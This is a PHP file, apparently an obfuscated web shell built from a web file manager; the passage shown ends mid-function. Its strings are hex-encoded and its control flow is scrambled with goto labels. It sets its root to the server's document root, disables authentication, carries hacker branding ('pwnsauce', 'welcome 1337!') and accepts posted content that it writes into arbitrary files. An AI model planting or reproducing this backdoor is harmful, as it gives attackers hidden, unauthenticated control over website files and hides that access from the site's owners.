<?php goto opet_1c490; opet_1c490: $CONFIG = "\x7B\042\x6C\141\x6E\147\x22\072\x22\145\x6E\042\x2C\042\x65\162\x72\157\x72\137\x72\145\x70\157\x72\164\x69\156\x67\042\x3A\146\x61\154\x73\145\x2C\042\x73\150\x6F\167\x5F\150\x69\144\x64\145\x6E\042\x3A\164\x72\165\x65\054\x22\150\x69\144\x65\137\x43\157\x6C\163\x22\072\x66\141\x6C\163\x65\054\x22\164\x68\145\x6D\145\x22\072\x22\144\x61\162\x6B\042\x7D";
define("\x56\105\x52\123\x49\117\x4E", "\x20");
define("\x41\120\x50\137\x54\111\x54\114\x45", "\x20");
$use_auth =false;
$auth_users = array(
    "\x30\071\x31\070" => "\x24\062\x79\044\x31\060\x24\132\x2F\153\x43\153\x57\167\x31\156\x42\167\x65\071\x79\132\x65\066\x36\126\x62\143\x75\151\x64\071\x67\107\x75\056\x30\066\x59\172\x43\154\x6E\132\x36\120\x31\164\x65\121\x65\065\x6A\132\x6C\131\x4B\067\x51\165",
);

$readonly_users = array(
    "\x75\163\x65\162"
);
$global_readonly = false;
$directories_users = array();
$use_highlightjs = true;
$highlightjs_style = "\x69\162\x2D\142\x6C\141\x63\153";
$edit_files = true;
$default_timezone = "\x45\164\x63\057\x55\124\x43";
$root_path = $_SERVER["\x44\117\x43\125\x4D\105\x4E\124\x5F\122\x4F\117\x54"];
$root_url = "";
$http_host = $_SERVER["\x48\124\x54\120\x5F\110\x4F\123\x54"];
$iconv_input_encoding = "\x55\124\x46\055\x38";
$datetime_format = "\x6D\057\x64\057\x59\040\x67\072\x69\040\x41";
$path_display_mode = "\x66\165\x6C\154";
$allowed_file_extensions = "";
$allowed_upload_extensions = "";
$favicon_path = "";
$exclude_items = array();
$online_viewer = "\x67\157\x6F\147\x6C\145";
$sticky_navbar = true;
$max_upload_size_bytes = 5000000000;
$upload_chunk_size_bytes = 2000000;
$ip_ruleset = "\x4F\106\x46";
$ip_silent = true;
$ip_whitelist = array(
    "\x31\062\x37\056\x30\056\x30\056\x31",    
    "\x3A\072\x31"           
);
$ip_blacklist = array(
    "\x30\056\x30\056\x30\056\x30",      
    "\x3A\072"            
);
$config_file = __DIR__."\x2F\143\x6F\156\x66\151\x67\056\x70\150\x70";
if (is_readable($config_file)) {
    @include($config_file);
}
$external = array(
    "\x63\163\x73\055\x62\157\x6F\164\x73\164\x72\141\x70" => "\x3C\154\x69\156\x6B\040\x68\162\x65\146\x3D\042\x68\164\x74\160\x73\072\x2F\057\x63\144\x6E\056\x6A\163\x64\145\x6C\151\x76\162\x2E\156\x65\164\x2F\156\x70\155\x2F\142\x6F\157\x74\163\x74\162\x61\160\x40\065\x2E\062\x2E\062\x2F\144\x69\163\x74\057\x63\163\x73\057\x62\157\x6F\164\x73\164\x72\141\x70\056\x6D\151\x6E\056\x63\163\x73\042\x20\162\x65\154\x3D\042\x73\164\x79\154\x65\163\x68\145\x65\164\x22\040\x69\156\x74\145\x67\162\x69\164\x79\075\x22\163\x68\141\x33\070\x34\055\x5A\145\x6E\150\x38\067\x71\130\x35\112\x6E\113\x32\112\x6C\060\x76\127\x61\070\x43\153\x32\162\x64\153\x51\062\x42\172\x65\160\x35\111\x44\170\x62\143\x6E\103\x65\165\x4F\170\x6A\172\x72\120\x46\057\x65\164\x33\125\x52\171\x39\102\x76\061\x57\124\x52\151\x22\040\x63\162\x6F\163\x73\157\x72\151\x67\151\x6E\075\x22\141\x6E\157\x6E\171\x6D\157\x75\163\x22\076",
    "\x63\163\x73\055\x64\162\x6F\160\x7A\157\x6E\145" => "\x3C\154\x69\156\x6B\040\x68\162\x65\146\x3D\042\x68\164\x74\160\x73\072\x2F\057\x63\144\x6E\152\x73\056\x63\154\x6F\165\x64\146\x6C\141\x72\145\x2E\143\x6F\155\x2F\141\x6A\141\x78\057\x6C\151\x62\163\x2F\144\x72\157\x70\172\x6F\156\x65\057\x35\056\x39\056\x33\057\x6D\151\x6E\057\x64\162\x6F\160\x7A\157\x6E\145\x2E\155\x69\156\x2E\143\x73\163\x22\040\x72\145\x6C\075\x22\163\x74\171\x6C\145\x73\150\x65\145\x74\042\x3E",
    "\x63\163\x73\055\x66\157\x6E\164\x2D\141\x77\145\x73\157\x6D\145" => "\x3C\154\x69\156\x6B\040\x72\145\x6C\075\x22\163\x74\171\x6C\145\x73\150\x65\145\x74\042\x20\150\x72\145\x66\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x6A\163\x2E\143\x6C\157\x75\144\x66\154\x61\162\x65\056\x63\157\x6D\057\x61\152\x61\170\x2F\154\x69\142\x73\057\x66\157\x6E\164\x2D\141\x77\145\x73\157\x6D\145\x2F\064\x2E\067\x2E\060\x2F\143\x73\163\x2F\146\x6F\156\x74\055\x61\167\x65\163\x6F\155\x65\056\x6D\151\x6E\056\x63\163\x73\042\x20\143\x72\157\x73\163\x6F\162\x69\147\x69\156\x3D\042\x61\156\x6F\156\x79\155\x6F\165\x73\042\x3E",
    "\x63\163\x73\055\x68\151\x67\150\x6C\151\x67\150\x74\152\x73" => "\x3C\154\x69\156\x6B\040\x72\145\x6C\075\x22\163\x74\171\x6C\145\x73\150\x65\145\x74\042\x20\150\x72\145\x66\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x6A\163\x2E\143\x6C\157\x75\144\x66\154\x61\162\x65\056\x63\157\x6D\057\x61\152\x61\170\x2F\154\x69\142\x73\057\x68\151\x67\150\x6C\151\x67\150\x74\056\x6A\163\x2F\061\x31\056\x36\056\x30\057\x73\164\x79\154\x65\163\x2F" . $highlightjs_style . "\x2E\155\x69\156\x2E\143\x73\163\x22\076",
    "\x6A\163\x2D\141\x63\145" => "\x3C\163\x63\162\x69\160\x74\040\x73\162\x63\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x6A\163\x2E\143\x6C\157\x75\144\x66\154\x61\162\x65\056\x63\157\x6D\057\x61\152\x61\170\x2F\154\x69\142\x73\057\x61\143\x65\057\x31\056\x31\063\x2E\061\x2F\141\x63\145\x2E\152\x73\042\x3E\074\x2F\163\x63\162\x69\160\x74\076",
    "\x6A\163\x2D\142\x6F\157\x74\163\x74\162\x61\160" => "\x3C\163\x63\162\x69\160\x74\040\x73\162\x63\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x2E\152\x73\144\x65\154\x69\166\x72\056\x6E\145\x74\057\x6E\160\x6D\057\x62\157\x6F\164\x73\164\x72\141\x70\100\x35\056\x32\056\x32\057\x64\151\x73\164\x2F\152\x73\057\x62\157\x6F\164\x73\164\x72\141\x70\056\x62\165\x6E\144\x6C\145\x2E\155\x69\156\x2E\152\x73\042\x20\151\x6E\164\x65\147\x72\151\x74\171\x3D\042\x73\150\x61\063\x38\064\x2D\117\x45\122\x63\101\x32\105\x71\152\x4A\103\x4D\101\x2B\057\x33\171\x2B\147\x78\111\x4F\161\x4D\105\x6A\167\x74\170\x4A\131\x37\161\x50\103\x71\163\x64\154\x74\142\x4E\112\x75\141\x4F\145\x39\062\x33\053\x6D\157\x2F\057\x66\066\x56\070\x51\142\x73\167\x33\042\x20\143\x72\157\x73\163\x6F\162\x69\147\x69\156\x3D\042\x61\156\x6F\156\x79\155\x6F\165\x73\042\x3E\074\x2F\163\x63\162\x69\160\x74\076",
    "\x6A\163\x2D\144\x72\157\x70\172\x6F\156\x65" => "\x3C\163\x63\162\x69\160\x74\040\x73\162\x63\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x6A\163\x2E\143\x6C\157\x75\144\x66\154\x61\162\x65\056\x63\157\x6D\057\x61\152\x61\170\x2F\154\x69\142\x73\057\x64\162\x6F\160\x7A\157\x6E\145\x2F\065\x2E\071\x2E\063\x2F\155\x69\156\x2F\144\x72\157\x70\172\x6F\156\x65\056\x6D\151\x6E\056\x6A\163\x22\076\x3C\057\x73\143\x72\151\x70\164\x3E",
    "\x6A\163\x2D\152\x71\165\x65\162\x79" => "\x3C\163\x63\162\x69\160\x74\040\x73\162\x63\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x6F\144\x65\056\x6A\161\x75\145\x72\171\x2E\143\x6F\155\x2F\152\x71\165\x65\162\x79\055\x33\056\x36\056\x31\056\x6D\151\x6E\056\x6A\163\x22\040\x69\156\x74\145\x67\162\x69\164\x79\075\x22\163\x68\141\x32\065\x36\055\x6F\070\x38\101\x77\121\x6E\132\x42\053\x56\104\x76\105\x39\164\x76\111\x58\162\x4D\121\x61\120\x6C\106\x46\123\x55\124\x52\053\x6E\154\x64\121\x6D\061\x4C\165\x50\130\x51\075\x22\040\x63\162\x6F\163\x73\157\x72\151\x67\151\x6E\075\x22\141\x6E\157\x6E\171\x6D\157\x75\163\x22\076\x3C\057\x73\143\x72\151\x70\164\x3E",
    "\x6A\163\x2D\152\x71\165\x65\162\x79\055\x64\141\x74\141\x74\141\x62\154\x65\163" => "\x3C\163\x63\162\x69\160\x74\040\x73\162\x63\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x2E\144\x61\164\x61\164\x61\142\x6C\145\x73\056\x6E\145\x74\057\x31\056\x31\063\x2E\061\x2F\152\x73\057\x6A\161\x75\145\x72\171\x2E\144\x61\164\x61\124\x61\142\x6C\145\x73\056\x6D\151\x6E\056\x6A\163\x22\040\x63\162\x6F\163\x73\157\x72\151\x67\151\x6E\075\x22\141\x6E\157\x6E\171\x6D\157\x75\163\x22\040\x64\145\x66\145\x72\076\x3C\057\x73\143\x72\151\x70\164\x3E",
    "\x6A\163\x2D\150\x69\147\x68\154\x69\147\x68\164\x6A\163" => "\x3C\163\x63\162\x69\160\x74\040\x73\162\x63\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x6A\163\x2E\143\x6C\157\x75\144\x66\154\x61\162\x65\056\x63\157\x6D\057\x61\152\x61\170\x2F\154\x69\142\x73\057\x68\151\x67\150\x6C\151\x67\150\x74\056\x6A\163\x2F\061\x31\056\x36\056\x30\057\x68\151\x67\150\x6C\151\x67\150\x74\056\x6D\151\x6E\056\x6A\163\x22\076\x3C\057\x73\143\x72\151\x70\164\x3E",
    "\x70\162\x65\055\x6A\163\x64\145\x6C\151\x76\162" => "\x3C\154\x69\156\x6B\040\x72\145\x6C\075\x22\160\x72\145\x63\157\x6E\156\x65\143\x74\042\x20\150\x72\145\x66\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x2E\152\x73\144\x65\154\x69\166\x72\056\x6E\145\x74\042\x20\143\x72\157\x73\163\x6F\162\x69\147\x69\156\x2F\076\x3C\154\x69\156\x6B\040\x72\145\x6C\075\x22\144\x6E\163\x2D\160\x72\145\x66\145\x74\143\x68\042\x20\150\x72\145\x66\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x2E\152\x73\144\x65\154\x69\166\x72\056\x6E\145\x74\042\x2F\076",
    "\x70\162\x65\055\x63\154\x6F\165\x64\146\x6C\141\x72\145" => "\x3C\154\x69\156\x6B\040\x72\145\x6C\075\x22\160\x72\145\x63\157\x6E\156\x65\143\x74\042\x20\150\x72\145\x66\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x6A\163\x2E\143\x6C\157\x75\144\x66\154\x61\162\x65\056\x63\157\x6D\042\x20\143\x72\157\x73\163\x6F\162\x69\147\x69\156\x2F\076\x3C\154\x69\156\x6B\040\x72\145\x6C\075\x22\144\x6E\163\x2D\160\x72\145\x66\145\x74\143\x68\042\x20\150\x72\145\x66\075\x22\150\x74\164\x70\163\x3A\057\x2F\143\x64\156\x6A\163\x2E\143\x6C\157\x75\144\x66\154\x61\162\x65\056\x63\157\x6D\042\x2F\076"
);
define("\x4D\101\x58\137\x55\120\x4C\117\x41\104\x5F\123\x49\132\x45", $max_upload_size_bytes);
define("\x55\120\x4C\117\x41\104\x5F\103\x48\125\x4E\113\x5F\123\x49\132\x45", $upload_chunk_size_bytes);
if ( !defined( "\x46\115\x5F\123\x45\123\x53\111\x4F\116\x5F\111\x44")) {
    define("\x46\115\x5F\123\x45\123\x53\111\x4F\116\x5F\111\x44", "\x66\151\x6C\145\x6D\141\x6E\141\x67\145\x72");
}
$cfg = new FM_Config();
$lang = isset($cfg->data["\x6C\141\x6E\147"]) ? $cfg->data["\x6C\141\x6E\147"] : "\x65\156";
$show_hidden_files = isset($cfg->data["\x73\150\x6F\167\x5F\150\x69\144\x64\145\x6E"]) ? $cfg->data["\x73\150\x6F\167\x5F\150\x69\144\x64\145\x6E"] : true;
$report_errors = isset($cfg->data["\x65\162\x72\157\x72\137\x72\145\x70\157\x72\164\x69\156\x67"]) ? $cfg->data["\x65\162\x72\157\x72\137\x72\145\x70\157\x72\164\x69\156\x67"] : true;
$hide_Cols = isset($cfg->data["\x68\151\x64\145\x5F\103\x6F\154\x73"]) ? $cfg->data["\x68\151\x64\145\x5F\103\x6F\154\x73"] : true;
$theme = isset($cfg->data["\x74\150\x65\155\x65"]) ? $cfg->data["\x74\150\x65\155\x65"] : "\x64\141\x72\153";
define("\x46\115\x5F\124\x48\105\x4D\105", $theme);
$lang_list = array(
    "\x65\156" => "\x45\156\x67\154\x69\163\x68"
);
if ($report_errors == true) {
    @ini_set("\x65\162\x72\157\x72\137\x72\145\x70\157\x72\164\x69\156\x67", E_ALL);
    @ini_set("\x64\151\x73\160\x6C\141\x79\137\x65\162\x72\157\x72\163", 1);
} else {
    @ini_set("\x65\162\x72\157\x72\137\x72\145\x70\157\x72\164\x69\156\x67", E_ALL);
    @ini_set("\x64\151\x73\160\x6C\141\x79\137\x65\162\x72\157\x72\163", 0);
}
if (defined("\x46\115\x5F\105\x4D\102\x45\104")) {
    $use_auth = false;
    $sticky_navbar = false;
} else {
    @set_time_limit(600);

    date_default_timezone_set($default_timezone);

    ini_set("\x64\145\x66\141\x75\154\x74\137\x63\150\x61\162\x73\145\x74", "\x55\124\x46\055\x38");
    if (version_compare(PHP_VERSION, "\x35\056\x36\056\x30", "\x3C") && function_exists("\x6D\142\x5F\151\x6E\164\x65\162\x6E\141\x6C\137\x65\156\x63\157\x64\151\x6E\147")) {
        mb_internal_encoding("\x55\124\x46\055\x38");
    }
    if (function_exists("\x6D\142\x5F\162\x65\147\x65\170\x5F\145\x6E\143\x6F\144\x69\156\x67")) {
        mb_regex_encoding("\x55\124\x46\055\x38");
    }

    session_cache_limiter("\x6E\157\x63\141\x63\150\x65");
    session_name(FM_SESSION_ID );
    function session_error_handling_function($code, $msg, $file, $line) {
        if ($code == 2) {
            session_abort();
            session_id(session_create_id());
            @session_start();
        }
    }
    set_error_handler("\x73\145\x73\163\x69\157\x6E\137\x65\162\x72\157\x72\137\x68\141\x6E\144\x6C\151\x6E\147\x5F\146\x75\156\x63\164\x69\157\x6E");
    session_start();
    restore_error_handler();
}
if( !function_exists("\x72\141\x6E\144\x6F\155\x5F\142\x79\164\x65\163") )
{
    function random_bytes($length = 6)
    {
        $characters = "\x30\061\x32\063\x34\065\x36\067\x38\071";
        $characters_length = strlen($characters);
        $output = "";
        for ($i = 0; $i < $length; $i++)
            $output .= $characters[rand(0, $characters_length - 1)];

        return $output;
    }
}
if (empty($_SESSION["\x74\157\x6B\145\x6E"])) {
    if (function_exists("\x72\141\x6E\144\x6F\155\x5F\142\x79\164\x65\163")) {
        $_SESSION["\x74\157\x6B\145\x6E"] = bin2hex(random_bytes(32));
    } else {
      $_SESSION["\x74\157\x6B\145\x6E"] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}

if (empty($auth_users)) {
    $use_auth = false;
}

$is_https = isset($_SERVER["\x48\124\x54\120\x53"]) && ($_SERVER["\x48\124\x54\120\x53"] == "\x6F\156" || $_SERVER["\x48\124\x54\120\x53"] == 1)
    || isset($_SERVER["\x48\124\x54\120\x5F\130\x5F\106\x4F\122\x57\101\x52\104\x45\104\x5F\120\x52\117\x54\117"]) && $_SERVER["\x48\124\x54\120\x5F\130\x5F\106\x4F\122\x57\101\x52\104\x45\104\x5F\120\x52\117\x54\117"] == "\x68\164\x74\160\x73";

if (isset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]) && !empty($directories_users[$_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]])) {
    $wd = fm_clean_path(dirname($_SERVER["\x50\110\x50\137\x53\105\x4C\106"]));
    $root_url =  $root_url.$wd.DIRECTORY_SEPARATOR.$directories_users[$_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]];
}

$root_url = fm_clean_path($root_url);
defined("\x46\115\x5F\122\x4F\117\x54\137\x55\122\x4C") || define("\x46\115\x5F\122\x4F\117\x54\137\x55\122\x4C", ($is_https ? "\x68\164\x74\160\x73" : "\x68\164\x74\160") . "\x3A\057\x2F" . $http_host . (!empty($root_url) ? "\x2F" . $root_url : ""));
defined("\x46\115\x5F\123\x45\114\x46\137\x55\122\x4C") || define("\x46\115\x5F\123\x45\114\x46\137\x55\122\x4C", ($is_https ? "\x68\164\x74\160\x73" : "\x68\164\x74\160") . "\x3A\057\x2F" . $http_host . $_SERVER["\x50\110\x50\137\x53\105\x4C\106"]);
if (isset($_GET["\x6C\157\x67\157\x75\164"])) {
    unset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]);
    unset( $_SESSION["\x74\157\x6B\145\x6E"]); 
    fm_redirect(FM_SELF_URL);
}
if ($ip_ruleset != "\x4F\106\x46") {
    function getClientIP() {
        if (array_key_exists("\x48\124\x54\120\x5F\103\x46\137\x43\117\x4E\116\x45\103\x54\111\x4E\107\x5F\111\x50", $_SERVER)) {
            return  $_SERVER["\x48\124\x54\120\x5F\103\x46\137\x43\117\x4E\116\x45\103\x54\111\x4E\107\x5F\111\x50"];
        }else if (array_key_exists("\x48\124\x54\120\x5F\130\x5F\106\x4F\122\x57\101\x52\104\x45\104\x5F\106\x4F\122", $_SERVER)) {
            return  $_SERVER["\x48\124\x54\120\x5F\130\x5F\106\x4F\122\x57\101\x52\104\x45\104\x5F\106\x4F\122"];
        }else if (array_key_exists("\x52\105\x4D\117\x54\105\x5F\101\x44\104\x52", $_SERVER)) {
            return $_SERVER["\x52\105\x4D\117\x54\105\x5F\101\x44\104\x52"];
        }else if (array_key_exists("\x48\124\x54\120\x5F\103\x4C\111\x45\116\x54\137\x49\120", $_SERVER)) {
            return $_SERVER["\x48\124\x54\120\x5F\103\x4C\111\x45\116\x54\137\x49\120"];
        }
        return "";
    }

    $clientIp = getClientIP();
    $proceed = false;
    $whitelisted = in_array($clientIp, $ip_whitelist);
    $blacklisted = in_array($clientIp, $ip_blacklist);

    if($ip_ruleset == "\x41\116\x44"){
        if($whitelisted == true && $blacklisted == false){
            $proceed = true;
        }
    } else
    if($ip_ruleset == "\x4F\122"){
         if($whitelisted == true || $blacklisted == false){
            $proceed = true;
        }
    }

    if($proceed == false){
        trigger_error("\x55\163\x65\162\x20\143\x6F\156\x6E\145\x63\164\x69\157\x6E\040\x64\145\x6E\151\x65\144\x20\146\x72\157\x6D\072\x20" . $clientIp, E_USER_WARNING);

        if($ip_silent == false){
            fm_set_msg(lng("\x41\143\x63\145\x73\163\x20\144\x65\156\x69\145\x64\056\x20\111\x50\040\x72\145\x73\164\x72\151\x63\164\x69\157\x6E\040\x61\160\x70\154\x69\143\x61\142\x6C\145"), "\x65\162\x72\157\x72");
            fm_show_header_login();
            fm_show_message();
        }
        exit();
    }
}

if ($use_auth) {
    if (isset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"], $auth_users[$_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]])) {
    } elseif (isset($_POST["\x66\155\x5F\165\x73\162"], $_POST["\x66\155\x5F\160\x77\144"], $_POST["\x74\157\x6B\145\x6E"])) {
        sleep(1);
        if(function_exists("\x70\141\x73\163\x77\157\x72\144\x5F\166\x65\162\x69\146\x79")) {
            if (isset($auth_users[$_POST["\x66\155\x5F\165\x73\162"]]) && isset($_POST["\x66\155\x5F\160\x77\144"]) && password_verify($_POST["\x66\155\x5F\160\x77\144"], $auth_users[$_POST["\x66\155\x5F\165\x73\162"]]) && verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
                $_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"] = $_POST["\x66\155\x5F\165\x73\162"];
                fm_set_msg(lng("\x77\145\x6C\143\x6F\155\x65\040\x31\063\x33\067\x21"));
                fm_redirect(FM_SELF_URL);
            } else {
                unset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]);
                fm_set_msg(lng("\x77\162\x6F\156\x67"), "\x65\162\x72\157\x72");
                fm_redirect(FM_SELF_URL);
            }
        } else {
            fm_set_msg(lng("\x70\141\x73\163\x77\157\x72\144\x5F\150\x61\163\x68\040\x6E\157\x74\040\x73\165\x70\160\x6F\162\x74\145\x64\054\x20\125\x70\147\x72\141\x64\145\x20\120\x48\120\x20\166\x65\162\x73\151\x6F\156"), "\x65\162\x72\157\x72");;
        }
    } else {
        unset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]);
        fm_show_header_login(); ?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?PHp echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>
                                    <div class="mb-3">
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>
                                    <div class="mb-3">
                                        <?PHp fm_show_message(); ?>
                                    </div>
                                    <input type="hidden" name="token" value="<?PHp echo htmlentities($_SESSION['token']); ?>" />
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                            <?PHp echo lng('>>'); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            <a>&copy;pwnsauce</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php goto opet_1c8e6; opet_1c8e6: fm_show_footer_login();
        exit;
    }
}

if ($use_auth && isset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"])) {
    $root_path = isset($directories_users[$_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]]) ? $directories_users[$_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]] : $root_path;
}

$root_path = rtrim($root_path, "\x5C\134\x2F");
$root_path = str_replace("\x5C\134", "\x2F", $root_path);
if (!@is_dir($root_path)) {
    echo "\x3C\150\x31\076".lng("\x52\157\x6F\164\x20\160\x61\164\x68")."\x20\134"{$root_path}\"\x20".lng("\x6E\157\x74\040\x66\157\x75\156\x64\041")."\x20\074\x2F\150\x31\076";
    exit;
}

defined("\x46\115\x5F\123\x48\117\x57\137\x48\111\x44\104\x45\116") || define("\x46\115\x5F\123\x48\117\x57\137\x48\111\x44\104\x45\116", $show_hidden_files);
defined("\x46\115\x5F\122\x4F\117\x54\137\x50\101\x54\110") || define("\x46\115\x5F\122\x4F\117\x54\137\x50\101\x54\110", $root_path);
defined("\x46\115\x5F\114\x41\116\x47") || define("\x46\115\x5F\114\x41\116\x47", $lang);
defined("\x46\115\x5F\106\x49\114\x45\137\x45\130\x54\105\x4E\123\x49\117\x4E") || define("\x46\115\x5F\106\x49\114\x45\137\x45\130\x54\105\x4E\123\x49\117\x4E", $allowed_file_extensions);
defined("\x46\115\x5F\125\x50\114\x4F\101\x44\137\x45\130\x54\105\x4E\123\x49\117\x4E") || define("\x46\115\x5F\125\x50\114\x4F\101\x44\137\x45\130\x54\105\x4E\123\x49\117\x4E", $allowed_upload_extensions);
defined("\x46\115\x5F\105\x58\103\x4C\125\x44\105\x5F\111\x54\105\x4D\123") || define("\x46\115\x5F\105\x58\103\x4C\125\x44\105\x5F\111\x54\105\x4D\123", (version_compare(PHP_VERSION, "\x37\056\x30\056\x30", "\x3C") ? serialize($exclude_items) : $exclude_items));
defined("\x46\115\x5F\104\x4F\103\x5F\126\x49\105\x57\105\x52") || define("\x46\115\x5F\104\x4F\103\x5F\126\x49\105\x57\105\x52", $online_viewer);
define("\x46\115\x5F\122\x45\101\x44\117\x4E\114\x59", $global_readonly || ($use_auth && !empty($readonly_users) && isset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]) && in_array($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"], $readonly_users)));
define("\x46\115\x5F\111\x53\137\x57\111\x4E", DIRECTORY_SEPARATOR == "\x5C\134");

if (!isset($_GET["\x70"]) && empty($_FILES)) {
    fm_redirect(FM_SELF_URL . "\x3F\160\x3D");
}
$p = isset($_GET["\x70"]) ? $_GET["\x70"] : (isset($_POST["\x70"]) ? $_POST["\x70"] : "");
$p = fm_clean_path($p);
$input = file_get_contents("\x70\150\x70\072\x2F\057\x69\156\x70\165\x74");
$_POST = (strpos($input, "\x61\152\x61\170") != FALSE && strpos($input, "\x73\141\x76\145") != FALSE) ? json_decode($input, true) : $_POST;

define("\x46\115\x5F\120\x41\124\x48", $p);
define("\x46\115\x5F\125\x53\105\x5F\101\x55\124\x48", $use_auth);
define("\x46\115\x5F\105\x44\111\x54\137\x46\111\x4C\105", $edit_files);
defined("\x46\115\x5F\111\x43\117\x4E\126\x5F\111\x4E\120\x55\124\x5F\105\x4E\103") || define("\x46\115\x5F\111\x43\117\x4E\126\x5F\111\x4E\120\x55\124\x5F\105\x4E\103", $iconv_input_encoding);
defined("\x46\115\x5F\125\x53\105\x5F\110\x49\107\x48\114\x49\107\x48\124\x4A\123") || define("\x46\115\x5F\125\x53\105\x5F\110\x49\107\x48\114\x49\107\x48\124\x4A\123", $use_highlightjs);
defined("\x46\115\x5F\110\x49\107\x48\114\x49\107\x48\124\x4A\123\x5F\123\x54\131\x4C\105") || define("\x46\115\x5F\110\x49\107\x48\114\x49\107\x48\124\x4A\123\x5F\123\x54\131\x4C\105", $highlightjs_style);
defined("\x46\115\x5F\104\x41\124\x45\124\x49\115\x45\137\x46\117\x52\115\x41\124") || define("\x46\115\x5F\104\x41\124\x45\124\x49\115\x45\137\x46\117\x52\115\x41\124", $datetime_format);

unset($p, $use_auth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style);

if ((isset($_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"], $auth_users[$_SESSION[FM_SESSION_ID]["\x6C\157\x67\147\x65\144"]]) || !FM_USE_AUTH) && isset($_POST["\x61\152\x61\170"], $_POST["\x74\157\x6B\145\x6E"]) && !FM_READONLY) {
    if(!verifyToken($_POST["\x74\157\x6B\145\x6E"])) {
        header("\x48\124\x54\120\x2F\061\x2E\060\x20\064\x30\061\x20\125\x6E\141\x75\164\x68\157\x72\151\x7A\145\x64");
        die("\x49\156\x76\141\x6C\151\x64\040\x54\157\x6B\145\x6E\056");
    }

    if(isset($_POST["\x74\171\x70\145"]) && $_POST["\x74\171\x70\145"]=="\x73\145\x61\162\x63\150") {
        $dir = $_POST["\x70\141\x74\150"] == "\x2E" ? "": $_POST["\x70\141\x74\150"];
        $response = scan(fm_clean_path($dir), $_POST["\x63\157\x6E\164\x65\156\x74"]);
        echo json_encode($response);
        exit();
    }

    if (isset($_POST["\x74\171\x70\145"]) && $_POST["\x74\171\x70\145"] == "\x73\141\x76\145") {
        $path = FM_ROOT_PATH;
        if (FM_PATH != "") {
            $path .= "\x2F" . FM_PATH;
        }
        if (!is_dir($path)) {
            fm_redirect(FM_SELF_URL . "\x3F\160\x3D");
        }
        $file = $_GET["\x65\144\x69\164"];
        $file = fm_clean_path($file);
        $file = str_replace("\x2F", "", $file);
        if ($file == "" || !is_file($path . "\x2F" . $file)) {
            fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
            $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
        }
        header("\x58\055\x58\123\x53\055\x50\162\x6F\164\x65\143\x74\151\x6F\156\x3A\060");
        $file_path = $path . "\x2F" . $file;

        $writedata = $_POST["\x63\157\x6E\164\x65\156\x74"];
        $fd = fopen($file_path, "\x77");
        $write_results = @fwrite($fd, $writedata);
        fclose($fd);
        if ($write_results === false){
            header("\x48\124\x54\120\x2F\061\x2E\061\x20\065\x30\060\x20\111\x6E\164\x65\162\x6E\141\x6C\040\x53\145\x72\166\x65\162\x20\105\x72\162\x6F\162");
            die("\x43\157\x75\154\x64\040\x4E\157\x74\040\x57\162\x69\164\x65\040\x46\151\x6C\145\x21\040\x2D\040\x43\150\x65\143\x6B\040\x50\145\x72\155\x69\163\x73\151\x6F\156\x73\040\x2F\040\x4F\167\x6E\145\x72\163\x68\151\x70");
        }
        die(true);
    }

    if (isset($_POST["\x74\171\x70\145"]) && $_POST["\x74\171\x70\145"] == "\x62\141\x63\153\x75\160" && !empty($_POST["\x66\151\x6C\145"])) {
        $fileName = fm_clean_path($_POST["\x66\151\x6C\145"]);
        $fullPath = FM_ROOT_PATH . "\x2F";
        if (!empty($_POST["\x70\141\x74\150"])) {
            $relativeDirPath = fm_clean_path($_POST["\x70\141\x74\150"]);
            $fullPath .= "\x7B\044\x72\145\x6C\141\x74\151\x76\145\x44\151\x72\120\x61\164\x68\175\x2F";
        }
        $date = date("\x64\115\x79\055\x48\151\x73");
        $newFileName = "\x7B\044\x66\151\x6C\145\x4E\141\x6D\145\x7D\055\x7B\044\x64\141\x74\145\x7D\056\x62\141\x6B";
        $fullyQualifiedFileName = $fullPath . $fileName;
        try {
            if (!file_exists($fullyQualifiedFileName)) {
